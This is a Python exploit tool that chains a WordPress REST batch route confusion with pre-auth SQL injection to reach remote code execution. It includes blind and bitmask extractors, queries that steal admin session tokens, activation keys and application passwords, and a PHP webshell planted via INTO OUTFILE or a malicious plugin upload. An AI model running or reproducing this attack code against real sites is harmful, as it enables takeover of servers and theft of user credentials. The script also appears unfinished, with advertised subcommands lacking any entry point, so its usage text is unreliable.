#!/usr/bin/env python3
"""
wp2shell — CVE-2026-63030 + CVE-2026-60137 Exploit
Pre-auth SQLi → RCE in WordPress Core (6.9.0-6.9.4, 7.0.0-7.0.1)

Synthesis of best techniques from all published PoCs:
  Icex0/wp2shell-poc     — marker probe, paired timing, boolean oracle, AdminSession
  47Cid/wp2shell-lab     — FastExtractor (X-WP-Total bitmask), Docker lab, INTO OUTFILE
  ZephrFish/wp2shell-scanner — Nuclei template, mass-scan
  attackercan/wp2shell-poc2  — simplified variant
  ekomsSavior/wp2shell   — interactive menu (payload fixed)

Usage:
  python3 wp2shell.py http://target.com                 # full auto chain
  python3 wp2shell.py http://target.com check           # marker probe only
  python3 wp2shell.py http://target.com check --confirm-sqli
  python3 wp2shell.py http://target.com extract --fast  # fast X-WP-Total mode
  python3 wp2shell.py http://target.com extract --blind # blind binary search
  python3 wp2shell.py http://target.com rce --outfile /var/www/html/x.php
  python3 wp2shell.py http://target.com rce --plugin --user admin --password pass
"""

from __future__ import annotations

import argparse
import http.cookiejar
import io
import json
import os
import re
import secrets
import shlex
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional, Tuple

VERSION = "3.0"
USER_AGENT = "wp2shell/3.0"
TIMEOUT = 30

# wp_parse_url() returns false for any string without a host/port — this seeds
# one WP_Error into the batch request list, desyncing $matches from $validation.
DESYNC_PRIMER = {"method": "POST", "path": "///"}

# All three codes appear together ONLY when the $matches/$validation desync is active.
MARKER_CODES = frozenset({"parse_path_failed", "block_cannot_read", "rest_batch_not_allowed"})


# ── colour ───────────────────────────────────────────────────────────────

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; C = "\033[96m"; D = "\033[2m"; BOLD = "\033[1m"; END = "\033[0m"

    def __init__(self, on: bool = True):
        self.on = on

    def _(self, colour: str, text: str) -> str:
        return f"{colour}{text}{self.END}" if self.on else text


# ── dataclasses ───────────────────────────────────────────────────────────

@dataclass
class Response:
    status: int
    elapsed: float
    body: str

    def json(self) -> Any:
        return json.loads(self.body)


@dataclass
class MarkerResult:
    reachable: bool
    desync_detected: bool
    codes_found: tuple

@dataclass
class TimingResult:
    confirmed: bool
    baseline: float
    delayed: float
    delta: float
    threshold: float
    samples: Tuple[Tuple[float, float], ...]


# ── HTTP client ──────────────────────────────────────────────────────────

class BatchClient:
    """Sends requests to REST batch endpoint, builds injection payloads."""

    def __init__(
        self, base_url: str, *, timeout: float = TIMEOUT,
        rest_route: bool = False, proxy: Optional[str] = None,
    ):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.rest_route = rest_route
        handlers = []
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        self._opener = urllib.request.build_opener(*handlers)

    @property
    def endpoint(self) -> str:
        if self.rest_route:
            return f"{self.base_url}/?rest_route=/batch/v1"
        return f"{self.base_url}/wp-json/batch/v1"

    def post(self, payload: dict, timeout: Optional[float] = None) -> Response:
        req = urllib.request.Request(
            self.endpoint, data=json.dumps(payload).encode(), method="POST",
            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
        )
        t = timeout or self.timeout
        start = time.monotonic()
        try:
            resp = self._opener.open(req, timeout=t)
            return Response(resp.status, time.monotonic() - start,
                            resp.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace") if e.fp else ""
            return Response(e.code, time.monotonic() - start, body)
        except OSError as e:
            raise ConnectionError(f"cannot reach {self.endpoint}: {e}") from None

    def get(self, path: str, timeout: Optional[float] = None) -> Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        req = urllib.request.Request(url, method="GET",
                                     headers={"User-Agent": USER_AGENT})
        t = timeout or self.timeout
        start = time.monotonic()
        try:
            resp = self._opener.open(req, timeout=t)
            return Response(resp.status, time.monotonic() - start,
                            resp.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace") if e.fp else ""
            return Response(e.code, time.monotonic() - start, body)
        except OSError as e:
            raise ConnectionError(f"cannot reach {url}: {e}") from None

    # ── admin endpoint probe ────────────────────────────────────────────

    def route_shift_dispatch(self, target_path: str,
                             target_method: str = "GET",
                             handler_shim_path: str = "/wp/v2/posts",
                             handler_shim_method: str = "GET") -> Response:
        """Use route confusion to dispatch *target_path* under *handler_shim*'s
        handler. The shim request's matched handler processes the target request.

        Returns the overall batch response.
        """
        inner = {
            "requests": [
                DESYNC_PRIMER,
                {"method": target_method, "path": target_path},
                {"method": handler_shim_method, "path": handler_shim_path},
            ]
        }
        return self.post({
            "requests": [
                DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        })

    def route_shifted_response(self, response: Response) -> Optional[dict]:
        """Extract the inner[1] body from a route-shifted batch response."""
        try:
            outer = response.json()
            inner_body = outer["responses"][1]["body"]
            return inner_body["responses"][1]
        except (KeyError, IndexError, TypeError, ValueError, json.JSONDecodeError):
            return None

    # ── payload builders ────────────────────────────────────────────────

    def inject(self, author_not_in: str) -> Response:
        """Place author_not_in into WP_Query author__not_in via double-confusion."""
        return self.post(self._payload(author_not_in))

    def ping(self) -> bool:
        """Quick check: is the batch endpoint alive at all?"""
        try:
            r = self.post({"requests": []}, timeout=15)
            return r.status in (200, 207)
        except Exception:
            return False

    def marker_probe(self) -> Response:
        """Non-destructive probe that exposes the route-confusion desync.

        Uses /wp/v2/block-renderer/core/archives as a sentinel route.
        On 6.8.x this route does not exist, so the probe returns HTTP 500.
        Callers should check ping() first and skip the marker probe on 6.8.x.
        """
        return self.post({
            "requests": [
                DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        })

    def injection_rows(self, response: Response) -> Optional[list]:
        """Extract inner get_items() result rows from nested batch response."""
        try:
            inner = response.json()["responses"][1]["body"]
            result = inner["responses"][1]["body"]
        except (KeyError, IndexError, TypeError, ValueError):
            return None
        return result if isinstance(result, list) else None

    def _payload(self, author_not_in: str) -> dict:
        """Build the double-confusion batch body.

        Outer: [primer, POST /wp/v2/posts (body=inner), POST /batch/v1]
          → posts sub-request dispatched under batch handler (self-call)
        Inner: [primer, GET /wp/v2/users?author_exclude=X, GET /wp/v2/posts]
          → users sub-request dispatched under posts get_items()
          → author_exclude → author__not_in → raw SQL
        """
        inner = {
            "requests": [
                DESYNC_PRIMER,
                {
                    "method": "GET",
                    "path": "/wp/v2/users?author_exclude="
                    + urllib.parse.quote(author_not_in, safe=""),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return {
            "requests": [
                DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }


# ── detection ────────────────────────────────────────────────────────────

def marker_probe(client: BatchClient) -> MarkerResult:
    """Non-destructive route-confusion detection via error code pattern."""
    resp = client.marker_probe()
    codes = _collect_error_codes(resp)
    reachable = resp.status == 207
    # On 6.8.x the probe payload crashes (HTTP 500) but we still get codes.
    # Unreachable = no response at all or connection refused.
    return MarkerResult(
        reachable=reachable or bool(codes),
        desync_detected=MARKER_CODES.issubset(codes),
        codes_found=tuple(sorted(codes)),
    )


def timing_confirm(client: BatchClient, *, sleep: float = 3.0,
                   samples: int = 3) -> TimingResult:
    """Confirm SQLi with paired baseline/delayed timing samples + median."""
    pairs = []
    for _ in range(samples):
        base = client.inject("SELECT IF(1=0,SLEEP(0),0)").elapsed
        slow = client.inject(f"SELECT IF(1=1,SLEEP({sleep:g}),0)").elapsed
        pairs.append((base, slow))
    bs = [p[0] for p in pairs]
    ds = [p[1] for p in pairs]
    dlt = [d - b for b, d in pairs]
    thresh = max(0.75, sleep * 0.6)
    return TimingResult(
        confirmed=statistics.median(dlt) >= thresh,
        baseline=statistics.median(bs), delayed=statistics.median(ds),
        delta=statistics.median(dlt), threshold=thresh, samples=tuple(pairs),
    )


def _collect_error_codes(resp: Response) -> set:
    codes = set()

    def walk(obj):
        if isinstance(obj, dict):
            c = obj.get("code")
            if isinstance(c, str):
                codes.add(c)
            for v in obj.values():
                walk(v)
        elif isinstance(obj, list):
            for item in obj:
                walk(item)

    try:
        walk(resp.json())
    except (ValueError, json.JSONDecodeError):
        pass
    return codes


# ── blind extraction (boolean oracle) ─────────────────────────────────────

class BlindExtractor:
    """Per-character extraction via boolean AND oracle — no SLEEP needed."""

    def __init__(self, client: BatchClient):
        self.client = client
        self.requests = 0

    def is_true(self, condition: str) -> bool:
        """Boolean oracle: AND (condition) → rows only when condition holds."""
        self.requests += 1
        resp = self.client.inject(f"0) AND ({condition})-- -")
        rows = self.client.injection_rows(resp)
        return bool(rows)

    def read_string(self, expression: str, *, max_length: int = 128,
                    on_progress: Optional[Callable[[str], None]] = None) -> str:
        chars = []
        for pos in range(1, max_length + 1):
            probe = f"ASCII(SUBSTRING(COALESCE(({expression}),''),{pos},1))"
            if not self.is_true(f"{probe} > 0"):
                break
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self.is_true(f"{probe} > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            chars.append(chr(lo))
            if on_progress:
                on_progress("".join(chars))
        return "".join(chars)

    def read_int(self, expression: str) -> int:
        text = self.read_string(expression).strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected integer, got {text!r}")
        return int(text)


# ── fast extraction (X-WP-Total bitmask oracle) ──────────────────────────

BITS_PER_CHAR = 7
DEFAULT_CHARS_PER_REQUEST = 16


class FastExtractor:
    """Batch-parallel extraction using X-WP-Total as a per-bit oracle.

    Packs 7 bit-probes × N characters into one HTTP request.  X-WP-Total
    counts UNION rows at the SQL level even when PHP filters them from the body.
    An entire password hash can be read in 1-4 requests instead of ~224.
    """

    def __init__(self, client: BatchClient):
        self.client = client
        self.requests = 0

    def read_string(self, expression: str, *, max_length: int = 128,
                    chars_per_request: int = DEFAULT_CHARS_PER_REQUEST,
                    on_progress: Optional[Callable[[str], None]] = None) -> str:
        result = []
        pos = 1
        while pos <= max_length:
            batch_size = min(chars_per_request, max_length - pos + 1)
            payload = self._build_payload(expression, pos, batch_size)
            self.requests += 1
            resp = self.client.post(payload)
            chars = self._parse_response(resp, batch_size)
            if chars is None:
                break
            for ch in chars:
                if ch == "\x00":
                    if on_progress and result:
                        on_progress("".join(result))
                    return "".join(result)
                result.append(ch)
            if on_progress:
                on_progress("".join(result))
            pos += batch_size
        return "".join(result)

    def read_int(self, expression: str) -> int:
        text = self.read_string(expression).strip()
        return int(text) if text.lstrip("-").isdigit() else 0

    @staticmethod
    def _build_payload(expression: str, start_pos: int,
                       num_chars: int) -> dict:
        inner = [DESYNC_PRIMER]
        for ci in range(num_chars):
            pos = start_pos + ci
            for bit in range(BITS_PER_CHAR):
                bit_val = 1 << bit
                sqli = (
                    f"0) AND 1=0 UNION SELECT 1 WHERE "
                    f"(ASCII(SUBSTRING(COALESCE(({expression}),''),{pos},1)) "
                    f"& {bit_val}) > 0-- -"
                )
                inner.append({
                    "method": "POST",
                    "path": f"/wp/v2/categories?author_exclude={urllib.parse.quote(sqli, safe='')}",
                    "body": {"name": "x", "orderby": False},
                })
                inner.append({"method": "GET", "path": "/wp/v2/posts"})
        return {
            "validation": "normal",
            "requests": [
                DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts",
                 "body": {"validation": "normal", "requests": inner}},
                {"method": "POST", "path": "/batch/v1"},
            ],
        }

    @staticmethod
    def _parse_response(resp: Response, num_chars: int) -> Optional[List[str]]:
        try:
            outer = resp.json()
            inner_body = outer["responses"][1]["body"]
            inner_responses = inner_body["responses"]
        except (KeyError, IndexError, TypeError, ValueError):
            return None
        chars = []
        for ci in range(num_chars):
            byte_val = 0
            for bit in range(BITS_PER_CHAR):
                probe_seq = ci * BITS_PER_CHAR + bit
                inner_idx = 1 + probe_seq * 2
                if inner_idx >= len(inner_responses):
                    return chars if chars else None
                sub = inner_responses[inner_idx]
                total = FastExtractor._x_wp_total(sub)
                if total is not None and total > 0:
                    byte_val |= (1 << bit)
            chars.append(chr(byte_val))
        return chars

    @staticmethod
    def _x_wp_total(sub_response: dict) -> Optional[int]:
        headers = sub_response.get("headers", {})
        if isinstance(headers, list):
            return None
        for key in ("X-WP-Total", "x-wp-total", "X-Wp-Total"):
            val = headers.get(key)
            if val is not None:
                try:
                    return int(val)
                except (ValueError, TypeError):
                    pass
        return None


# ── RCE: INTO OUTFILE webshell (pre-auth, needs FILE privilege) ───────────

_SHELL_MARKER = "WP2SHELL_OUTFILE"


def rce_outfile(client: BatchClient, outfile_dir: str = "/var/lib/mysql-files",
                web_dir: str = "/rce") -> Optional[Tuple[str, str, str, bool]]:
    """Write token-gated PHP webshell via UNION SELECT INTO OUTFILE.

    Returns (web_path, token, filename, reachable) or None.
    reachable=False means file was written (INTO OUTFILE succeeded) but the
    webserver returned 404/connection-error — common when DB + web are
    separate containers (Docker) and OUTFILE writes to the DB filesystem.
    Requires MySQL FILE privilege and web_dir served by the webserver.
    """
    token = secrets.token_hex(16)
    fname = f"s_{secrets.token_hex(4)}.php"
    outfile_path = f"{outfile_dir}/{fname}"
    web_path = f"{web_dir}/{fname}"

    # Minimal token-gated webshell — only responds to the correct token.
    php = (
        "<?php "
        f"if(hash_equals('{token}',(string)($_GET['t']??''))&&isset($_GET['c']))"
        "{echo shell_exec((string)$_GET['c']);} "
        "?>"
    )
    sqli = (
        f"0) AND 1=0 UNION SELECT '{_escape_sql(php)}' "
        f"INTO OUTFILE '{_escape_sql(outfile_path)}'-- -"
    )
    resp = client.inject(sqli)
    if resp.status == 207:
        # Verify the webshell is actually reachable from the web server.
        # INTO OUTFILE writes to the DB server's filesystem — in Docker or
        # split-horizon setups the DB container != web container.
        if rce_run(client, web_path, token, "echo 1") is not None:
            return web_path, token, fname, True
        return web_path, token, fname, False
    return None


def rce_run(client: BatchClient, shell_path: str, token: str,
            command: str, timeout: float = 60) -> Optional[str]:
    """Execute command via token-gated webshell."""
    qs = urllib.parse.urlencode({"t": token, "c": command})
    try:
        resp = client.get(f"{shell_path}?{qs}", timeout=timeout)
        # Only 2xx means the webshell actually executed — 404/403 are
        # Apache/nginx error pages, not shell output.
        if 200 <= resp.status < 300:
            return resp.body.strip()
    except Exception:
        pass
    return None


def _escape_sql(s: str) -> str:
    return s.replace("\\", "\\\\").replace("'", "\\'")


# ── RCE: plugin-upload webshell (post-auth, needs admin credentials) ──────

_PLUGIN_MARKER = "WP2SHELL_PLUGIN"


class AdminShell:
    """Authenticated admin session for plugin-upload RCE."""

    def __init__(self, base_url: str, *, timeout: float = 20,
                 proxy: Optional[str] = None):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self._slug = "wp2shell_" + secrets.token_hex(4)
        self._token = secrets.token_hex(16)
        self._jar = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self._jar)]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        self._opener = urllib.request.build_opener(*handlers)
        self._opener.addheaders = [("User-Agent", USER_AGENT)]

    def login(self, username: str, password: str) -> bool:
        self._get("/wp-login.php")
        self._post("/wp-login.php", urllib.parse.urlencode({
            "log": username, "pwd": password, "wp-submit": "Log In",
            "redirect_to": f"{self.base_url}/wp-admin/", "testcookie": "1",
        }).encode(), {"Content-Type": "application/x-www-form-urlencoded"})
        return any(c.name.startswith("wordpress_logged_in") for c in self._jar)

    def deploy(self) -> str:
        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._extract_nonce(page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")
        body, ct = self._multipart(
            {"_wpnonce": nonce,
             "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
             "install-plugin-submit": "Install Now"},
            {"pluginzip": (f"{self._slug}.zip", self._plugin_zip())},
        )
        self._post(f"/wp-admin/update.php?action=upload-plugin", body, {"Content-Type": ct})
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def run(self, shell_path: str, command: str) -> Optional[str]:
        qs = urllib.parse.urlencode({"t": self._token, "c": command})
        try:
            resp = self._get(f"{shell_path}?{qs}")
            m = re.search(rf"{_PLUGIN_MARKER}::(.*?)::END", resp, re.S)
            return m.group(1) if m else resp[:500]
        except Exception:
            return None

    def cleanup(self, shell_path: str) -> bool:
        try:
            self.run(shell_path,
                     'd=$(pwd); case "$d" in */wp-content/plugins/*) '
                     'cd / && rm -rf "$d";; esac')
        except Exception:
            return False
        try:
            self._get(shell_path)
        except urllib.error.HTTPError as e:
            return e.code == 404
        except Exception:
            return False
        return False

    def _get(self, path: str) -> str:
        return self._opener.open(self.base_url + path, timeout=self.timeout
                                 ).read().decode("utf-8", "replace")

    def _post(self, path: str, data, headers: Optional[dict] = None) -> str:
        req = urllib.request.Request(self.base_url + path, data=data,
                                     headers=headers or {})
        return self._opener.open(req, timeout=self.timeout
                                 ).read().decode("utf-8", "replace")

    def _plugin_zip(self) -> bytes:
        php = (
            "<?php\n/*\nPlugin Name: wp2shell PoC\nDescription: Delete after testing.\n"
            "Version: 1.0\nAuthor: wp2shell\n*/\nchdir(__DIR__);\n"
            f"if(hash_equals('{self._token}',(string)($_GET['t']??''))&&isset($_GET['c']))"
            "{echo '" + _PLUGIN_MARKER + "::' . shell_exec((string)$_GET['c']) . '::END';}\n"
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"{self._slug}/{self._slug}.php", php)
        return buf.getvalue()

    @staticmethod
    def _extract_nonce(html: str) -> Optional[str]:
        m = re.search(r'name="_wpnonce"[^>]*value="([0-9a-f]+)"', html)
        return m.group(1) if m else None

    @staticmethod
    def _multipart(fields: Dict[str, str],
                   files: Dict[str, Tuple[str, bytes]]) -> Tuple[bytes, str]:
        boundary = "----wp2shell" + uuid.uuid4().hex
        buf = io.BytesIO()
        for name, val in fields.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                      f'{val}\r\n'.encode())
        for name, (fname, content) in files.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{name}"; '
                      f'filename="{fname}"\r\n'.encode())
            buf.write(b"Content-Type: application/octet-stream\r\n\r\n"
                      + content + b"\r\n")
        buf.write(f"--{boundary}--\r\n".encode())
        return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


# ── version constants ───────────────────────────────────────────────────

# 6.8.x: SQLi exists in WP_Query author__not_in but requires a "facilitated"
# path (plugin/theme passing raw input to WP_Query). No direct REST API or
# batch route-confusion vector exists on 6.8.x. Our exploit cannot reach it.
# 6.9.x-7.0.x: Full RCE chain via batch route confusion + SQLi.
SQLI_ONLY_UNABLE_TO_REACH = {
    (6, 8, 0), (6, 8, 1), (6, 8, 2), (6, 8, 3), (6, 8, 4), (6, 8, 5),
}
FULL_CHAIN_EXPLOITABLE = {
    (6, 9, 0): "RCE (batch confusion + SQLi)",
    (6, 9, 1): "RCE (batch confusion + SQLi)",
    (6, 9, 2): "RCE (batch confusion + SQLi)",
    (6, 9, 3): "RCE (batch confusion + SQLi)",
    (6, 9, 4): "RCE (batch confusion + SQLi)",
    (7, 0, 0): "RCE (batch confusion + SQLi)",
    (7, 0, 1): "RCE (batch confusion + SQLi)",
}
PATCHED = {(6, 8, 6), (6, 9, 5), (7, 0, 2)}
BTF = "batch route confusion triggered by"
SQLI_ONLY_NOTE = (
    f"6.8.x: SQLi exists (CVE-2026-60137) but patch was {BTF} plugin/theme "
    "passing raw input to WP_Query. Our batch-confusion exploit cannot reach it. "
    "WordPress 6.9.0 introduced the batch refactor that made the route confusion + "
    "RCE chain exploitable (CVE-2026-63030)."
)


def parse_version(raw: str) -> Optional[Tuple[int, int, int]]:
    parts = raw.strip().strip("'\"").split(".")
    try:
        nums = [int(p) for p in parts[:3]]
    except ValueError:
        return None
    while len(nums) < 3:
        nums.append(0)
    return tuple(nums[:3])


def detect_version(client: BatchClient, c: C, v: bool = False
                   ) -> Optional[Tuple[int, int, int]]:
    found = []
    try:
        resp = client.get("/wp-json/")
        if resp.status < 400:
            js = resp.json()
            if isinstance(js, dict):
                gen = js.get("generator", "")
                for t in str(gen).split():
                    if t[:1].isdigit():
                        found.append(t)
                if js.get("version"):
                    found.append(str(js["version"]))
    except Exception:
        pass
    try:
        resp = client.get("/")
        if resp.status < 400:
            for m in re.finditer(
                    r'name="generator"\s*content="WordPress\s+([\d.]+)"',
                    resp.body):
                found.append(m.group(1))
            for m in re.finditer(r"[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)",
                                 resp.body):
                found.append(m.group(1))
                break
    except Exception:
        pass
    for rv in found:
        ver = parse_version(rv)
        if ver:
            if v:
                print(f"    {c._(C.D, f'candidate: {rv} => {ver}')}")
            return ver
    return None


# ── 6.8.x direct REST API probe ──────────────────────────────────────────

def probe_685_direct(client: BatchClient, sleep: int, c: C, v: bool = False
                     ) -> Optional[bool]:
    """Test whether author_exclude reaches WP_Query directly on 6.8.x."""
    import urllib.request as ur
    root = client.base_url.rstrip("/")
    rest_prefix = (f"{root}/?rest_route=" if client.rest_route
                   else f"{root}/wp-json")
    posts_url = f"{rest_prefix}/wp/v2/posts"

    info(f"6.8.x direct REST API probe (author_exclude via GET)...")

    def _get(url, timeout):
        rq = ur.Request(url, method="GET", headers={"User-Agent": USER_AGENT})
        start = time.monotonic()
        try:
            with ur.urlopen(rq, timeout=timeout) as r:
                return time.monotonic() - start, r.status
        except ur.HTTPError as e:
            return time.monotonic() - start, e.code
        except Exception:
            return None, 0

    # Baseline: valid integer
    sep = "&" if client.rest_route else "?"
    bt, bcode = _get(f"{posts_url}{sep}author_exclude=1&per_page=1",
                     timeout=max(TIMEOUT, sleep * 5))
    if bcode != 200:
        if v:
            info(f"  baseline HTTP {bcode} — endpoint may require auth")
        return None
    info(f"  baseline: {bt:.2f}s (HTTP {bcode})")

    # Payload: SQLi attempt via author_exclude
    for probe_name, payload in [
        ("SLEEP via comma-list", f"1) OR SLEEP({sleep})-- -"),
        ("SLEEP via space-list", f"1) OR SLEEP({sleep})-- -"),
    ]:
        qs = urllib.parse.urlencode({
            "author_exclude": payload,
            "per_page": "1",
        })
        elapsed, pcode = _get(f"{posts_url}&{qs}",
                              timeout=max(TIMEOUT, sleep * 5 + 10))
        if elapsed is None:
            info(f"  {probe_name}: request failed")
            continue

        delta = elapsed - bt
        threshold = max(sleep * 0.7, 1.5)
        if delta >= threshold:
            good(f"  {probe_name}: DELAY {delta:.1f}s — SQLi CONFIRMED via direct REST!")
            return True
        elif pcode == 400:
            info(f"  {probe_name}: HTTP 400 — validation rejected (expected)")
        else:
            info(f"  {probe_name}: HTTP {pcode}, Δ{delta:.2f}s — no delay")

    return False


# ── presets ───────────────────────────────────────────────────────────────

FINGERPRINT = [
    ("MySQL version", "SELECT @@version"),
    ("Database user", "SELECT CURRENT_USER()"),
    ("Database name", "SELECT DATABASE()"),
]

# Admin REST endpoints to probe via route confusion.
# (path, method, description, auth_required_reason)
ADMIN_PROBES = [
    ("GET", "/wp/v2/users", "list users (list_users cap)"),
    ("GET", "/wp/v2/users/me", "current user (read cap)"),
    ("GET", "/wp/v2/settings", "site settings (manage_options)"),
    ("POST", "/wp/v2/pages", "create page (edit_pages)"),
    ("POST", "/wp/v2/posts", "create post (edit_posts)"),
    ("DELETE", "/wp/v2/posts/1", "delete post (delete_posts)"),
    ("GET", "/wp/v2/plugins", "list plugins (activate_plugins)"),
    ("GET", "/wp/v2/themes", "list themes (edit_themes)"),
    ("GET", "/wp/v2/taxonomies", "list taxonomies (manage_categories)"),
    ("GET", "/wp/v2/media", "list media (upload_files)"),
    ("GET", "/wp/v2/comments", "list comments (moderate_comments)"),
    ("GET", "/wp/v2/block-patterns/patterns", "block patterns (edit_posts)"),
    ("GET", "/wp/v2/menu-items", "menu items (edit_theme_options)"),
    ("GET", "/wp/v2/templates", "templates (edit_theme_options)"),
]

# DB secrets that might enable privilege escalation if extracted.
SECRET_QUERIES = [
    ("admin session tokens",
     "SELECT meta_value FROM wp_usermeta "
     "WHERE user_id=(SELECT MIN(id) FROM wp_users "
     "INNER JOIN wp_usermeta ON id=user_id "
     "WHERE meta_key='wp_capabilities' "
     "AND meta_value LIKE '%administrator%') "
     "AND meta_key='session_tokens' LIMIT 1"),
    ("user activation keys",
     "SELECT user_activation_key FROM wp_users "
     "WHERE user_login=(SELECT user_login FROM wp_users "
     "INNER JOIN wp_usermeta ON id=user_id "
     "WHERE meta_key='wp_capabilities' "
     "AND meta_value LIKE '%administrator%' LIMIT 1)"),
    ("application passwords",
     "SELECT meta_value FROM wp_usermeta "
     "WHERE meta_key LIKE '%application_password%' LIMIT 1"),
    ("REST API nonce keys in options",
     "SELECT option_value FROM wp_options "
     "WHERE option_name LIKE '%nonce%' LIMIT 1"),
    ("recent transients (may contain cached nonces/auth)",
     "SELECT CONCAT(option_name, 0x3d, option_value) FROM wp_options "
     "WHERE option_name LIKE '%_transient_timeout_%' "
     "ORDER BY option_value DESC LIMIT 1"),
]


def cmd_probe(args: argparse.Namespace) -> int:
    """Probe admin endpoints via route confusion + extract secrets."""
    client = BatchClient(
        args.url, timeout=args.timeout, rest_route=args.rest_route,
        proxy=args.proxy,
    )

    # Phase 1: confirm route confusion is active
    info("confirming route confusion is active...")
    marker = marker_probe(client)
    if not marker.reachable:
        bad("target unreachable")
        return 1
    if marker.desync_detected:
        good(f"route confusion ACTIVE (codes: {', '.join(marker.codes_found)})")
    else:
        warn(f"desync pattern NOT detected (codes: {', '.join(marker.codes_found)})")
        if not marker.codes_found:
            bad("no error codes — batch endpoint may be blocked")
            return 2
        warn("proceeding anyway; results may reflect patched behaviour")

    # Phase 2: send baseline (public endpoint via same route shift)
    print()
    info("establishing baseline (public endpoint via route shift)...")
    baseline_resp = client.route_shift_dispatch("/wp/v2/posts", "GET")
    baseline_shifted = client.route_shifted_response(baseline_resp)
    if baseline_shifted is None:
        bad("baseline probe failed — batch endpoint may be blocked")
        return 1
    baseline_sig = _response_signature(baseline_shifted)
    info(f"baseline: HTTP {baseline_resp.status}, {baseline_sig}")

    # Phase 3: probe admin endpoints vs baseline
    print()
    info("probing admin REST endpoints via route confusion...")
    print(f"    {'ENDPOINT':<42} {'SIG':>22}  {'RESULT'}")
    print(f"    {'─'*42} {'─'*22}  {'─'*30}")

    findings = []
    for method, path, desc in ADMIN_PROBES:
        resp = client.route_shift_dispatch(path, method)
        shifted = client.route_shifted_response(resp)

        if shifted is None:
            sig = "(no response)"
            diff = _paint("33", "PARSE ERROR") if _TTY else "PARSE ERROR"
        else:
            sig = _response_signature(shifted)
            # Compare against baseline: if signature differs, the admin
            # endpoint reached different code than the public endpoint.
            if sig == baseline_sig:
                diff = _paint("2", "same as baseline") if _TTY else "same as baseline"
            else:
                diff = _paint("32", "DIFFERS FROM BASELINE") if _TTY else "DIFFERS FROM BASELINE"
                findings.append((path, method, desc, shifted, sig))

        label = f"{method} {path}"
        print(f"    {label:<42} {sig:>22}  {diff}")

    # Phase 3: extract secrets via blind SQLi (if --confirm-sqli)
    if args.confirm_sqli:
        print()
        info("extracting potential escalation secrets via blind SQLi...")
        extractor = BlindExtractor(client)
        for label, query in SECRET_QUERIES:
            info(f"  {label}:")
            try:
                val = extractor.read_string(query, max_length=256,
                                            on_progress=_progress)
                _clear_progress()
                if val:
                    good(f"    {_short(val, limit=120)}")
                else:
                    warn("    (empty / not found)")
            except Exception as e:
                warn(f"    failed: {e}")
        info(f"{extractor.requests} request(s) sent")

    # Summary
    print()
    if findings:
        warn(f"{len(findings)} endpoint(s) returned DIFFERENT response from baseline:")
        for path, method, desc, _, sig in findings:
            good(f"  {method} {path}  →  {sig}  ({desc})")
        info("Diff from baseline = different code path reached. Investigate these.")
    else:
        good("All admin endpoints returned identical response to baseline.")
        info("Route shift dispatches everything under the same handler — no endpoint-specific code reached.")

    return 0


def _response_signature(shifted: dict) -> str:
    """Stable fingerprint of a route-shifted sub-response for comparison."""
    if not isinstance(shifted, dict):
        return f"type={type(shifted).__name__}"
    status = shifted.get("status", "?")
    code = shifted.get("code", "-")
    body = shifted.get("body", shifted)
    if isinstance(body, list):
        shape = f"list[{len(body)}]"
        keys = ""
    elif isinstance(body, dict):
        shape = "dict"
        # Top-level keys fingerprint the response type
        top_keys = sorted(k for k in body if not k.startswith("_"))[:5]
        keys = "(" + ",".join(top_keys) + ")" if top_keys else ""
    elif isinstance(body, str):
        shape = f"str[{len(body)}]"
        keys = ""
    elif body is None:
        shape = "null"
        keys = ""
    else:
        shape = type(body).__name__
        keys = ""
    return f"{status}/{code}/{shape}{keys}"


# ── CLI ───────────────────────────────────────────────────────────────────

_TTY = sys.stdout.isatty()


def info(msg: str) -> None:
    print(f"[*] {msg}")


def good(msg: str) -> None:
    print(f"\033[32m[+]\033[0m {msg}" if _TTY else f"[+] {msg}")


def bad(msg: str) -> None:
    print(f"\033[31m[-]\033[0m {msg}" if _TTY else f"[-] {msg}")


def warn(msg: str) -> None:
    print(f"\033[33m[!]\033[0m {msg}" if _TTY else f"[!] {msg}")


def _progress(text: str) -> None:
    if _TTY:
        sys.stdout.write(f"\r\033[K    {text}")
        sys.stdout.flush()


def _clear_progress() -> None:
    if _TTY:
        sys.stdout.write("\r\033[K")
